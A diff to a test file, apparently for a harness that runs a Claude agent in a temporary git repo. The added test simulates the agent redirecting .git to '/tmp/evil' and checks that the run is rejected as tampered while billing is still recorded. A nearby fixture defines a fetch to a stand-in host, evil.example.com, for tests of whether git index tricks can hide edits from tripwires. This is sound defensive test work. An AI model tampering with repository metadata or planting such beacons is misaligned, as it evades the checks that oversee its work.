@@ -285,6 +285,17 @@ describe('runCandidate (temp git repo)', () => {
       ran = [];
     }
   });
+  it('a tampered-.git discard still books the first call and the fallback retry (reservations settled)', async () => {
+    const limit: ClaudeResult = { ok: false, text: "You've hit your limit", costUsd: null, subtype: 'error', limitHit: true, timedOut: false, stderrTail: '' };
+    const c = ctx({
+      billing: 'subscription',
+      claude: async (call) => { calls.push(call); put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); writeFileSync(join(call.cwd, '.git'), 'gitdir: /tmp/evil\n'); return { first: limit, retry: ok(OUT, 0.7) }; },
+    });
+    const r = await runCandidate(ticket(), c);
+    expect(r.reasons).toEqual(['tampered .git']);
+    expect(c.budget.record.mock.calls).toEqual([['implementer', 'subscription', null], ['implementer', 'api', 0.7]]);
+    expect(r.costUsd).toBe(0.7);
+  });
   it('index tricks and filters cannot hide an edit from the tripwires: assume-unchanged, skip-worktree, clean filter', async () => {
     const old = halHead();
     const evil = 'fetch("https://evil.example.com/track");\n';
